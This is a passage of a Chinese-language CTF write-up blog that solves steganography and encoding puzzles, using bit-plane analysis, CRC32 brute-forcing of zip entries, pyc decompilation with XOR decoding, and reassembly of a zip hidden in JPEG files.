class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width,height=img.size</span><br><span class="line">color=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">            pixel = img.getpixel((<span class="number">9</span>*j + z, i))</span><br><span class="line">            <span class="keyword">if</span> pixel == (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">                color += <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                color += <span class="string">&quot;0&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(color),<span class="number">8</span>):</span><br><span class="line">    flag+=chr(int(color[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>ais2{<del>Black_n_White_vi5ual_crYPtoGraPhY</del>}</p><h3 id="FRP09-Childhood-memories"><a href="#FRP09-Childhood-memories" class="headerlink" title="FRP09 Childhood memories"></a>FRP09 Childhood memories</h3><p>拿到一个txt文件，文件首行begin 664 quiz。改为后缀rar，解压再次改为rar，拿到两张图片。使用Bcompare拿到flag。</p><h3 id="CMP05-Not-long-enough"><a href="#CMP05-Not-long-enough" class="headerlink" title="CMP05 Not long enough"></a>CMP05 Not long enough</h3><p>一看就是CRC爆破，一开始使用好压压缩，每个文件为1kb，所以索性爆出1kb，但是没有爆出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s=string.printable</span><br><span class="line">f = zipfile.ZipFile(<span class="string">&quot;1.zip&quot;</span>)</span><br><span class="line">l = f.namelist()</span><br><span class="line">info=f.infolist()</span><br><span class="line">list_crc=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    GetCrc = f.getinfo(i)</span><br><span class="line">    crc = GetCrc.CRC</span><br><span class="line">    list_crc.append(hex(crc))</span><br><span class="line">print(list_crc[<span class="number">3</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list_crc:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> a1 <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> a2 <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">for</span> a3 <span class="keyword">in</span> s:</span><br><span class="line">                    <span class="keyword">for</span> a4 <span class="keyword">in</span> s:</span><br><span class="line">                        <span class="keyword">for</span> a5 <span class="keyword">in</span> s:</span><br><span class="line">                            flag=j+a1+a2+a3+a4+a5</span><br><span class="line">                            <span class="keyword">if</span> crc==(binascii.crc32(flag.encode())&amp;<span class="number">0xffffffff</span>):</span><br><span class="line">                                print(flag)</span><br></pre></td></tr></table></figure><p>但是发现爆破太慢了尝试工具。爆破六位crc使用以下工具：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="number">12521</span>\Desktop\CTF脚本\杂项\压缩包\crc32-master&gt;python3 crc32.py reverse <span class="number">0x15b89588</span></span><br><span class="line"><span class="number">4</span> bytes: &#123;<span class="number">0xc9</span>, <span class="number">0xbf</span>, <span class="number">0xd6</span>, <span class="number">0x30</span>&#125;</span><br><span class="line">verification checksum: <span class="number">0x15b89588</span> (OK)</span><br><span class="line">alternative: AKjKcy (OK)</span><br><span class="line">alternative: BVptH1 (OK)</span><br><span class="line">alternative: FRmuIR (OK)</span><br><span class="line">alternative: Ka6j7X (OK)</span><br><span class="line">alternative: ND4JDn (OK)</span><br><span class="line">alternative: SgZWO3 (OK)</span><br><span class="line">alternative: WcGVNP (OK)</span><br><span class="line">alternative: _iQ5Bx (OK)</span><br><span class="line">alternative: bYCMs4 (OK)</span><br><span class="line">alternative: c5qQli (OK)</span><br><span class="line">alternative: d093GV (OK)</span><br><span class="line">alternative: oKFBdr (OK)</span><br><span class="line">alternative: shint6 (OK)</span><br><span class="line">alternative: wltouU (OK)</span><br></pre></td></tr></table></figure><p>之后爆破了许多文件内容，找到可以字符串，输入压缩包密码，拿到txt。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">]cX^r:X\jXiV&#96;jVm\ipV&#96;ek\ijk&#96;e^t</span><br></pre></td></tr></table></figure><p>拿到一串字符串，凯撒暴力破解拿到flag。</p><h3 id="CMP09-Tails"><a href="#CMP09-Tails" class="headerlink" title="CMP09 Tails"></a>CMP09 Tails</h3><p>拿到一个压缩包，压缩包里面一个txt，提示flag不在这里，尝试ntfs隐写。拿到一个pyc文件，进行反编译。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/tools/python-uncompyle6-master/bin$ ./uncompyle6 <span class="number">1.</span>pyc</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;*************&#x27;</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">        s = chr(i ^ ord(flag[i]))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = ord(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = ord(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(str(s))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = [</span><br><span class="line"> <span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;102&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;132&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;112&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;137&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;99&#x27;</span>, <span class="string">&#x27;112&#x27;</span>]</span><br></pre></td></tr></table></figure><p>写解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ciphertext = [<span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;102&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;132&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;112&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;137&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;99&#x27;</span>, <span class="string">&#x27;112&#x27;</span>]</span><br><span class="line">ciphertext = ciphertext[::<span class="number">-1</span>]</span><br><span class="line">print(ciphertext)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> num,key <span class="keyword">in</span> enumerate(ciphertext):</span><br><span class="line">        <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            key = int(key) - <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key = int(key) + <span class="number">10</span></span><br><span class="line">        flag+=chr(num ^ key)</span><br><span class="line">print(flag)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h3 id="FRP14-Watermark2"><a href="#FRP14-Watermark2" class="headerlink" title="FRP14 Watermark2"></a>FRP14 Watermark2</h3><p>盲水印</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bwmforpy3.py decode hui.png  hui_with_wm.png flag.png --oldseed</span><br></pre></td></tr></table></figure><h3 id="FRP13-Watermark"><a href="#FRP13-Watermark" class="headerlink" title="FRP13 Watermark"></a>FRP13 Watermark</h3><p>频域盲水印</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 &#x2F;root&#x2F;桌面&#x2F;steady&#x2F;1.py --original ori.png --image res.png --result out.png</span><br></pre></td></tr></table></figure><h2 id="网题"><a href="#网题" class="headerlink" title="网题"></a>网题</h2><h3 id="杂项-3"><a href="#杂项-3" class="headerlink" title="杂项"></a>杂项</h3><h4 id="男神"><a href="#男神" class="headerlink" title="男神"></a>男神</h4><p>拿到两张图片，想到盲水印，但是先使用stegsolve试试。使用image conbine功能在SUB处发现了二维码，使用扫描工具扫描不出来，这时候想到修补二维码。但是没法修补，再次尝试stegsolve。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/30.png" alt="30"></p><p>将图片保存为bmp，继续使用stegsolve。在Red plane 0、Green plane 0、Blue plane 0分别发现三张二维码，导出，扫描，拿到flag。</p><h4 id="enc"><a href="#enc" class="headerlink" title="enc"></a>enc</h4><p>使用stegsolve，发现Red plane 0全是黑色，于是把Alpha plane 0、Red plane 0、Green plane 0、Blue plane 0都保存下来。分别将Alpha plane 0、Red plane 0、Green plane 0、Blue plane 0另存为 <code>a.png</code>、<code>r.png</code>、<code>g.png</code>、<code>b.png</code>。</p><p>发现用StegSolve打开 <code>a.png</code>，Image Combiner打开 <code>g.png</code>，两者进行的异或运算能得到flag。这里一定要注意打开顺序，先打开a.png，然后在打开g.png。</p><h4 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h4><p>使用zsteg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;套娃# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;套娃&#x2F;2&#x2F;3&#x2F;4&#x2F;5&#x2F;6&#x2F;warmup.bmp&#39;</span><br></pre></td></tr></table></figure><p>没有检测到东西，尝试使用<code>--all</code>参数。</p><p>发现某些编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b1,r,msb,Xy         .. text: <span class="string">&quot;..?. !?.?. ..... ..... ..... ....? .!!?! ..... ..... ..... ....... ..!!! !!?.! ?.?!! !!!!? .!!?! ..... ..?.! ..... .....\n...!. . .?.!. ..... ..?.! ?.?.. ..... .?.!! ?!... .....\n.?.!. ..... ......? .!!!! !.!!! !!!!! !!!!! !!?.! ?.?!!\n!!!!! !?.!! ?!... .....&quot;</span></span><br><span class="line">b1,g,msb,Xy         .. text: <span class="string">&quot;.koO .koO .koO .koO .koO .koO .koO .koO .koO .koO .koO .koO .koOkoO .koO .koO .koO .koO .koO ?koO .koO !koO !koO ?koO\n!koO .koO oO !koO ?koO .koO ?koO .koO .koO .koO .koO\n.koO .koO .koO .koO .O .koO .koO .koO .koO .koO .koO\n.koO .koO .koO .koO .koO ?koO .k&quot;</span></span><br><span class="line">b1,b,msb,Xy         .. text: <span class="string">&quot;[+++ +++&lt;. --.+&gt; ]&lt;+++ &gt;-[++ +&lt;.++ +++++ ++&gt;]&lt; +++++ +&gt;-[+ +++++.- ----. --.-- --&gt;]&lt; ----- -&gt;-[+ +++++ &lt;.+++ +++++ &gt;]&lt;++\n++++&gt; - ----- &gt;]&lt;-- ----&gt; -[+++ +++&lt;. ---.+ ++&gt;]&lt; +++++\n++&gt;-[ +++++ ++&lt;+++&gt; -[+++ ++&lt;.+ +++++ +++++ +&gt;]&lt;+ +++++\n&gt;-[++ ++++&lt; .--.. -----&quot;</span></span><br></pre></td></tr></table></figure><p>但是数据不完整，使用limit参数加长数据。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/31.png" alt="31"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zsteg warmup.bmp b1,r,lsb,xy -l 2048</span><br></pre></td></tr></table></figure><p>分别提取ok、！</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/32.png" alt="32"></p><h4 id="pyflag"><a href="#pyflag" class="headerlink" title="pyflag"></a>pyflag</h4><p>拿到三个图片，发现三个图片中都有PK字样，应该是藏有zip，然后在每个文件的末尾发现了<code>SecretFile/.hint.txt</code>，使用string 挨个查一下。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/tools<span class="formula">$ strings  /home/steady/桌面/tools/Furan.jpg | grep &quot;Secret&quot;</span></span><br><span class="line"><span class="formula">[Secret File Part 2:]</span></span><br><span class="line"><span class="formula">SecretFile/</span></span><br><span class="line"><span class="formula">steady@steady:~/桌面/tools$</span> strings /home/steady/桌面/tools/Setsuna.jpg | grep &quot;Secret&quot;</span><br><span class="line">[Secret File Part 1:]PK</span><br><span class="line">SecretFile/PK</span><br><span class="line">SecretFile/.hint.txt</span><br><span class="line">SecretFile/flag.txt</span><br><span class="line">steady@steady:~/桌面/tools<span class="formula">$ strings  /home/steady/桌面/tools/Miku.jpg | grep &quot;Secret&quot;</span></span><br><span class="line"><span class="formula">[Secret File Part 3:]</span></span><br><span class="line"><span class="formula">SecretFile/.hint.txt</span></span><br><span class="line"><span class="formula">SecretFile/flag.txt</span></span><br></pre></td></tr></table></figure><p>可以看到很明显的标出每个图片是压缩包的第几部分。一开始是找到压缩包的敏感十六进制比如<code>504B0304 </code>，剪贴下来之后发现文件错误，重新观察一下，发现png文件尾部<code>FFD9</code>，后面都会有一串字符串，字符串之后的就是我们的压缩包数据。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/36.png" alt="36"></p><p>Setsuna.jpg，504B0102，很明显是压缩包的头部。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">50 4B 03 04 14 00 00 00 00 00 54 88 6C 50 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 0B 00 00 00 53 65</span><br><span class="line">63 72 65 74 46 69 6C 65 2F 50 4B 03 04 14 00 09</span><br><span class="line">00 08 00 74 86 6C 50 F9 1A 23 EB DF 00 00 00 E3</span><br><span class="line">00 00 00 14 00 00 00 53 65 63 72 65 74 46 69 6C</span><br><span class="line">65 2F 2E 68 69 6E 74 2E 74 78 74 D2 D0 98 8C 59</span><br><span class="line">64 4C 2A 21 4D 96 C0 5F 09 FE 93 67 3A 9D 5D FE</span><br><span class="line">1C C9 8E 6A 97 D9 F3 48 D5 FD 22 F0 36 F6 9F 89</span><br><span class="line">C1 F9 3E A2 00 DC 69 B0 FD 3E 58 3D 20 A3 6F 6B</span><br><span class="line">0A 66 63 EC B8 D9 22 93 63 A4 55 35 28 4C 51 2A</span><br><span class="line">A9 BD A8 86 09 B1 70 E5 52 D0 78 29 3C 95 FD AB</span><br><span class="line">42 97 9A DA E1 63 A9 6F FA 86 CD C9 0B 34 F2 D3</span><br><span class="line">68 1E A8 0F 67 4E 77 9D C6 BC 98 03 22 8D E5 24</span><br><span class="line">F6 3B 3E 93 11 0B 6E 2E 2E FB 38 9A 1F 40 47 A3</span><br><span class="line">D8 63 FD 32 9F AE C9 6A 42 E2 60 A7 5D 78 44 88</span><br><span class="line">1D 21 F4 AC 20 88 2C 51 FD 99 8A 22 31 51 A5 DD</span><br><span class="line">A3 52 4E CD 82 FE 1D 0E 68 D7 B1 2D 6B 10 C5 8B</span><br><span class="line">29 C4 E3 D2 5C AE 86 54 C7 44 65 23 75 3D 42 5A</span><br><span class="line">FD E8 89 3D 70 B8 FB 07 A7 22 1F 1A EC 11 91 48</span><br><span class="line">D2 E0 6C FD EF 09 3D F2 A6 27 50 4B 03 04 14 00</span><br><span class="line">09 00 08 00 0B 87 6C 50 B6 2F 9E CA DF 00 00 00</span><br><span class="line">68 01 00 00 13 00 00 00 53 65 63 72 65 74 46 69</span><br><span class="line">6C 65 2F 66 6C 61 67 2E 74 78 74 19 3A A9 27 82</span><br><span class="line">33 A6 C7 54 5D 93 5F D7 80 8E DB 94 73 47 BE 28</span><br><span class="line">9D 22 38 6A 60 6F 28 B8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Furan.jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">E5 83 02 F6 3A 15 21 55 C7 1E 28 B5 33 55 AA BA</span><br><span class="line">36 46 8C A9 E4 26 D8 9B A9 C3 94 91 53 61 26 C2</span><br><span class="line">EF 38 3B CE CC 5C DF 25 B7 DF 48 5E F3 B8 E1 02</span><br><span class="line">89 1A F2 95 8F 49 52 EE DA BE 11 1B 10 5B 7E 83</span><br><span class="line">0C 4D AB 6A DD 6E 24 18 D5 CE C1 E4 1B 6B 97 36</span><br><span class="line">66 5E 6A 13 41 37 FC CA E0 F6 A5 A7 4A C5 89 AD</span><br><span class="line">12 B2 0A AF BD CB AC 23 04 8C E9 44 3E C8 FE 46</span><br><span class="line">36 2F 8C 36 8C 81 F9 A6 61 9C B2 0E C1 9E B5 93</span><br><span class="line">A6 10 F9 00 DB 24 E5 F3 30 BC 19 EB 67 1C C6 46</span><br><span class="line">83 01 24 25 17 CC E3 84 C7 69 0D 09 04 73 E3 A9</span><br><span class="line">AC 84 57 1B B2 61 32 B0 AE 03 26 C4 A3 6F A3 4C</span><br><span class="line">3F 48 87 FB F0 D1 EC E3 10 F7 35 D8 27 22 DD 56</span><br><span class="line">99 90 50 4B 01 02 14 00 14 00 00 00 00 00 54 88</span><br><span class="line">6C 50 00 00 00 00 00 00 00 00 00 00 00 00 0B 00</span><br><span class="line">24 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00</span><br><span class="line">53 65 63 72 65 74 46 69 6C 65 2F 0A</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Miku.jpg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">18</span> <span class="number">00</span> <span class="number">81</span> <span class="number">37</span> <span class="number">39</span> FB <span class="number">4</span>C</span><br><span class="line">F8 D5 <span class="number">01</span> BB D9 <span class="number">0</span>E FC <span class="number">4</span>C F8 D5 <span class="number">01</span> <span class="number">00</span> <span class="number">2</span>E AD <span class="number">19</span> <span class="number">36</span></span><br><span class="line">F8 D5 <span class="number">01</span> <span class="number">50</span> <span class="number">4</span>B <span class="number">01</span> <span class="number">02</span> <span class="number">14</span> <span class="number">00</span> <span class="number">14</span> <span class="number">00</span> <span class="number">09</span> <span class="number">00</span> <span class="number">08</span> <span class="number">00</span> <span class="number">74</span></span><br><span class="line"><span class="number">86</span> <span class="number">6</span>C <span class="number">50</span> F9 <span class="number">1</span>A <span class="number">23</span> EB DF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> E3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line"><span class="number">00</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">29</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">53</span> <span class="number">65</span> <span class="number">63</span> <span class="number">72</span> <span class="number">65</span> <span class="number">74</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>C <span class="number">65</span> <span class="number">2</span>F <span class="number">2</span>E <span class="number">68</span> <span class="number">69</span> <span class="number">6</span>E</span><br><span class="line"><span class="number">74</span> <span class="number">2</span>E <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">0</span>A <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">18</span></span><br><span class="line"><span class="number">00</span> A7 <span class="number">8</span>A <span class="number">4</span>F <span class="number">71</span> <span class="number">4</span>B F8 D5 <span class="number">01</span> A8 <span class="number">8</span>A <span class="number">4</span>F <span class="number">71</span> <span class="number">4</span>B F8 D5</span><br><span class="line"><span class="number">01</span> <span class="number">00</span> B0 <span class="number">20</span> A8 <span class="number">34</span> F8 D5 <span class="number">01</span> <span class="number">50</span> <span class="number">4</span>B <span class="number">01</span> <span class="number">02</span> <span class="number">14</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line"><span class="number">00</span> <span class="number">09</span> <span class="number">00</span> <span class="number">08</span> <span class="number">00</span> <span class="number">0</span>B <span class="number">87</span> <span class="number">6</span>C <span class="number">50</span> B6 <span class="number">2</span>F <span class="number">9</span>E CA DF <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">68</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">13</span> <span class="number">00</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">80</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">3</span>A <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">53</span> <span class="number">65</span> <span class="number">63</span> <span class="number">72</span> <span class="number">65</span> <span class="number">74</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>C</span><br><span class="line"><span class="number">65</span> <span class="number">2</span>F <span class="number">66</span> <span class="number">6</span>C <span class="number">61</span> <span class="number">67</span> <span class="number">2</span>E <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">0</span>A <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">18</span> <span class="number">00</span> <span class="number">40</span> <span class="number">15</span> <span class="number">26</span> <span class="number">1</span>A <span class="number">4</span>C F8 D5 <span class="number">01</span> <span class="number">02</span> <span class="number">55</span></span><br><span class="line"><span class="number">86</span> B3 <span class="number">4</span>C F8 D5 <span class="number">01</span> <span class="number">63</span> FE <span class="number">25</span> <span class="number">1</span>A <span class="number">4</span>C F8 D5 <span class="number">01</span> <span class="number">50</span> <span class="number">4</span>B</span><br><span class="line"><span class="number">05</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span> <span class="number">28</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">4</span>A <span class="number">02</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后尝试弱口令解压压缩包，密码是1234。解压之后拿到文本信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我用各种baseXX编码把flag套娃加密了，你应该也有看出来。</span><br><span class="line">但我只用了一些常用的base编码哦，毕竟我的智力水平你也知道...像什么base36base58听都没听过</span><br><span class="line">提示：<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x30</span>,<span class="number">0x55</span></span><br></pre></td></tr></table></figure><p>hint已经提示了使用base16,32,64,85的编码。</p><p>使用脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 